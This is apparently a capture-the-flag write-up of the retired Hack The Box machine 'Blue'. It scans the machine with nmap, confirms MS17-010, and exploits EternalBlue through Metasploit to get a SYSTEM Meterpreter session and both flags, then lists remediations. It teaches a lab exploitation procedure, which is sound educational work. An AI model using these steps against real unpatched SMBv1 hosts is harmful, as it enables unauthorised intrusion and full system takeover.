---
title: Keep Calm and Hack The Box - Blue
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2020-08-18T21:37:01.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-blue
coverImage: https://www.freecodecamp.org/news/content/images/2020/08/2950db3b33ef23f38b5b41f2a00e9da7-1.jpg
tags:
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: information security
  slug: information-security
- name: '#infosec'
  slug: infosec
seo_title: null
seo_desc: "Hack The Box (HTB) is an online platform that allows you to test your penetration\
  \ testing skills. \nIt contains several challenges that are constantly updated.\
  \ Some of them simulate real world scenarios and some of them lean more towards\
  \ a CTF style o..."
---

Hack The Box (HTB) is an online platform that allows you to test your penetration testing skills. 

It contains several challenges that are constantly updated. Some of them simulate real world scenarios and some of them lean more towards a CTF style of challenge.

**Note**: _Only write-ups of retired HTB machines are allowed._

![Image](https://www.freecodecamp.org/news/content/images/2020/07/Screenshot-2020-07-29-at-21.06.35.png)

Blue is one of the simplest machines on Hack The Box. But it demonstrates the impact of the EternalBlue exploit, which has been used to compromise companies through large-scale ransomware and crypto-mining attacks.

We will use the following tools to pawn the box on a [Kali Linux box](https://www.kali.org/):

* nmap
* searchsploit
* metasploit
* meterpreter

Let's get started.

First, I add **Blue** on the /etc/hosts file.

```bash
nano /etc/hosts
```

with

```bash
10.10.10.40     blue.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-20.36.17.png)

## **Step 1 - Reconnaissance**

The first step before exploiting a machine is to do a little bit of scanning and reconnaissance.

This is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on this phase to get as much information as you can.

### Port scanning

I will use **Nmap** (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing. 

It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.

There are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation [here](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-20.41.34.png)

I use the following command to perform an intensive scan:

```bash
nmap -A -v blue.htb
```

**-A:** Enables OS detection, version detection, script scanning, and traceroute

**-v:** Increases verbosity level

**blue**.htb:**** hostname for the Blue box

If you find the results a little bit too overwhelming, you can try this:

```bash
nmap blue.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-20.42.15.png)

We can see that there are quite a few open ports including:

**Port** 445, Microsoft-DS (Directory Services) SMB file sharing

From the nmap scan, we have some information concerning the computer name (haris-PC) and the SMB version (2.02). 

The [Server Message Block (SMB)](https://en.wikipedia.org/wiki/Server_Message_Block) is a network protocol that enables users to communicate with remote computers and servers in order to use their resources or share, open, and edit files.

From the name of this box and that it's a Windows machine with port 445 opened, we can assume the machine is vulnerable to EternalBlue. I use an nmap script to verify this information with the following:

```bash
nmap --script vuln -p 445 blue.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-20.46.01.png)

We can see that the box is vulnerable to a Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010).

## **Step 2 - Understanding ms17-010**

What is ms17-010?

> **EternalBlue** is a cyberattack exploit developed by the U.S. National Security Agency (NSA). It was leaked by the Shadow Brokers hacker group on April 14, 2017, one month after Microsoft released patches for the vulnerability - Wikipedia

You can read more [[here](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)](null). This vulnerability was patched and is listed on Microsoft’s Security Bulletin as MS17-010.

EternalBlue allows hackers to remotely execute arbitrary code to gain access to a network. It exploits a vulnerability in the Windows OS SMB protocol. The exploit can compromise the entire network and devices connected to it. 

![Image](https://www.freecodecamp.org/news/content/images/2020/08/image-94.png)

Malware that utilises EternalBlue can propagate across networks. In 2017, [WannaCry](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack) – a crypto-ransomware – used the EternalBlue exploit which spread itself across the network infecting all connected devices. 

## **Step 3 - Exploiting EternalBlue**

I use **Searchsploit** to check if there is any known exploit. Searchsploit is a command line search tool for [Exploit Database](https://www.exploit-db.com/).

I use the following command:

```bash
searchsploit eternalblue
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.05.04.png)

I can get more details on an exploit with:

```bash
searchsploit -x 41738.py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.04.15.png)

You can also check the **Exploit Database** to find the exploit.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-20.55.20.png)
_[https://www.exploit-db.com/exploits/42315](https://www.exploit-db.com/exploits/42315)_

There is one Metasploit module available.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-20.56.41.png)
_[https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue)_

We will use **Metasploit**, which is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)
_[https://www.metasploit.com/](https://www.metasploit.com/" style="box-sizing: inherit; margin: 0px; padding: 0px; border: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; line-height: inherit; font-family: inherit; font-size: 17.6px; vertical-align: baseline; background-color: transparent; color: var(--gray90); text-decoration: underline; cursor: pointer; word-break: break-word;)_

I launch the **Metasploit Framework** on Kali and look for the command I should use for the exploit.

Don't forget to update Metasploit when you launch it with this command:

```bash
msfupdate
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.03.30.png)

You can also check if the target is vulnerable to EternalBlue on Metasploit using an auxiliary. Start with this command:

```bash
search eternalblue
```

then in that case

```bash
use 1
```

to select

```bash
auxiliary/scanner/smb/smb_ms17_010
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.10.25.png)

You can check the options with

```bash
show options
```

and set RHOSTS with

```bash
set RHOSTS blue.htb
```

Then run the auxiliary with

```bash
run
```

You can see that the host is likely to be vulnerable to MS17-010!

Let's now check the exploit with

```bash
use 2
```

or the command

```bash
exploit/windows/smb/ms17_010_eternalblue
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.31.53.png)

We need to set up the options for RHOSTS 

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.31.59.png)

and LHOST – mine was 10.10.14.24. You will need to set it up with your own LHOST. You can check yours [here](https://www.hackthebox.eu/home/htb/access).

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.30.21.png)

Before running the exploit, you can check here if the machine is vulnerable – this will run the auxiliary we used earlier with the command

```bash
check
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.32.10.png)

I then run the exploit with

```bash
run
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.30.40.png)

The exploit had to run several times before I got a **Meterpreter** session.

Here's the definition of Meterpreter from [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/):

> Meterpreter is an advanced, dynamically extensible payload that uses _in-memory_ DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.

You can read more about Meterpreter [here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.29.46.png)

Let's start by gathering some information.

**getuid** returns the real user ID of the calling process.

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.28.39.png)

**NT Authority**\**SYSTEM** or LocalSystem account is a built-in Windows account. It is the most powerful account on a Windows local instance. We have admin access on that machine.

## **Step** 4 **-** Looking for the user.txt flag

I navigate to the **haris** folder from **Documents and Settings**.

I can list all the files/folders with the following command:

```bash
ls -la
```

I then move to the **Desktop** with

```bash
cd Desktop
```

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.27.02.png)

And I find the user flag! I can check the contents of the file with

```bash
cat user.txt
```

## **Step 5 -** Looking for the root.txt flag

Let's find the root flag now. I navigate up to **Users** and check in to the **Administrator**/**Desktop** folder. I find the flag!

![Image](https://www.freecodecamp.org/news/content/images/2020/08/Screenshot-2020-08-17-at-21.26.16.png)

I use the following command to see the content of the file:

```bash
cat root.txt
```

Congrats! You found both flags.

## Remediations

* Patch your devices with the security update for Microsoft Windows SMB v1. You can check the [Microsoft Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) to see which OS's are affected
* Disable SMB v1 and use SMB v2 or v3
* Apply the p[rinciple of least privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege) to all your systems and services

Please don’t hesitate to comment, ask questions or share with your friends :)

You can see more articles from the series **Keep Calm and Hack the Box** [[here](https://www.freecodecamp.org/news/search/?query=keep%20calm%20and%20hack%20the%20box)](null).

You can follow me on [Twitter](https://twitter.com/SonyaMoisset) or on [LinkedIn](https://www.linkedin.com/in/sonyamoisset/).

And don't forget to #**GetSecure**, #**BeSecure** & #**StaySecure**!

![Image](https://www.freecodecamp.org/news/content/images/2020/08/2950db3b33ef23f38b5b41f2a00e9da7.jpg)

